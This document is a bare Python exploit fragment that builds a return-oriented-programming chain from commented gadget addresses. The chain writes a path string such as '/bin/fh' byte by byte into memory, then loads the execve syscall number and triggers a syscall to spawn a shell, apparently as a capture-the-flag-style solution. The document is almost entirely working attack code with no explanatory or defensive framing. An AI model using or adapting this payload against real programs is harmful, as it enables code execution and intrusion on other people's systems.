payload = p64(0x40f1da)
#0x000000000040f1da: pop rcx; ret; 
payload += p64(0x425058)+p64(0x407b19)
# 0x407b19: pop rdi ; retf 1
payload += p64(0x2f)+p32(0x40edf9)+p32(0x33)+"\x00"*1
# 0x000000000040edf9: xchg edi, eax; ret; 
payload += p64(0x4011ab)
# 0x00000000004011ab: add byte ptr [rcx], al; pop rbp; ret; 
payload += p64(0x0)+p64(0x40f1da)
# 0x000000000040f1da: pop rcx; ret; 
payload += p64(0x425059)+p64(0x407b19)
# 0x407b19: pop rdi ; retf 1
payload += p64(0x62)+p32(0x40edf9)+p32(0x33)+"\x00"*1
# 0x000000000040edf9: xchg edi, eax; ret; 
payload += p64(0x4011ab)
# 0x00000000004011ab: add byte ptr [rcx], al; pop rbp; ret; 
payload += p64(0x0)+p64(0x40f1da)
# 0x000000000040f1da: pop rcx; ret; 
payload += p64(0x42505a)+p64(0x407b19)
# 0x407b19: pop rdi ; retf 1
payload += p64(0x69)+p32(0x40edf9)+p32(0x33)+"\x00"*1
# 0x000000000040edf9: xchg edi, eax; ret; 
payload += p64(0x4011ab)
# 0x00000000004011ab: add byte ptr [rcx], al; pop rbp; ret; 
payload += p64(0x0)+p64(0x40f1da)
# 0x000000000040f1da: pop rcx; ret; 
payload += p64(0x42505b)+p64(0x407b19)
# 0x407b19: pop rdi ; retf 1
payload += p64(0x6e)+p32(0x40edf9)+p32(0x33)+"\x00"*1
# 0x000000000040edf9: xchg edi, eax; ret; 
payload += p64(0x4011ab)
# 0x00000000004011ab: add byte ptr [rcx], al; pop rbp; ret; 
payload += p64(0x0)+p64(0x40f1da)
# 0x000000000040f1da: pop rcx; ret; 
payload += p64(0x42505c)+p64(0x407b19)
# 0x407b19: pop rdi ; retf 1
payload += p64(0x2f)+p32(0x40edf9)+p32(0x33)+"\x00"*1
# 0x000000000040edf9: xchg edi, eax; ret; 
payload += p64(0x4011ab)
# 0x00000000004011ab: add byte ptr [rcx], al; pop rbp; ret; 
payload += p64(0x0)+p64(0x40f1da)
# 0x000000000040f1da: pop rcx; ret; 
payload += p64(0x42505d)+p64(0x407b19)
# 0x407b19: pop rdi ; retf 1
payload += p64(0x66)+p32(0x40edf9)+p32(0x33)+"\x00"*1
# 0x000000000040edf9: xchg edi, eax; ret; 
payload += p64(0x4011ab)
# 0x00000000004011ab: add byte ptr [rcx], al; pop rbp; ret; 
payload += p64(0x0)+p64(0x40f1da)
# 0x000000000040f1da: pop rcx; ret; 
payload += p64(0x42505e)+p64(0x407b19)
# 0x407b19: pop rdi ; retf 1
payload += p64(0x68)+p32(0x40edf9)+p32(0x33)+"\x00"*1
# 0x000000000040edf9: xchg edi, eax; ret; 
payload += p64(0x4011ab)
# 0x00000000004011ab: add byte ptr [rcx], al; pop rbp; ret; 
payload += p64(0x0)+p64(0x40f1da)
# 0x000000000040f1da: pop rcx; ret; 
payload += p64(0x42505f)+p64(0x407b19)
# 0x407b19: pop rdi ; retf 1
payload += p64(0x0)+p32(0x40edf9)+p32(0x33)+"\x00"*1
# 0x000000000040edf9: xchg edi, eax; ret; 
payload += p64(0x4011ab)
# 0x00000000004011ab: add byte ptr [rcx], al; pop rbp; ret; 
payload += p64(0x0)+p64(0x407b19)
# 0x407b19: pop rdi ; retf 1
payload += p64(0x0)+p32(0x40edf9)+p32(0x33)+"\x00"*1
# 0x000000000040edf9: xchg edi, eax; ret; 
payload += p64(0x4011ad)
# 0x00000000004011ad: pop rbp; ret; 
payload += p64(0xc1)+p64(0x407b19)
# 0x407b19: pop rdi ; retf 1
payload += p64(0x22b24eb2)+p32(0x40edf9)+p32(0x33)+"\x00"*1
# 0x000000000040edf9: xchg edi, eax; ret; 
payload += p64(0x40130a)
# 0x000000000040130a: lea esi, [rax]; add al, bpl; sbb eax, 0xebfffffd; add edx, dword ptr [rax - 0x366ffe15]; ret; 
payload += p64(0x40f1da)
# 0x000000000040f1da: pop rcx; ret; 
payload += p64(0x0)+p64(0x407b19)
# 0x407b19: pop rdi ; retf 1
payload += p64(0x3b)+p32(0x40edf9)+p32(0x33)+"\x00"*1
# 0x000000000040edf9: xchg edi, eax; ret; 
payload += p64(0x407b19)
# 0x407b19: pop rdi ; retf 1
payload += p64(0x425058)+p32(0x40820b)+p32(0x33)+"\x00"*1
# 0x000000000040820b: mov edx, ecx; syscall; 
payload += b''
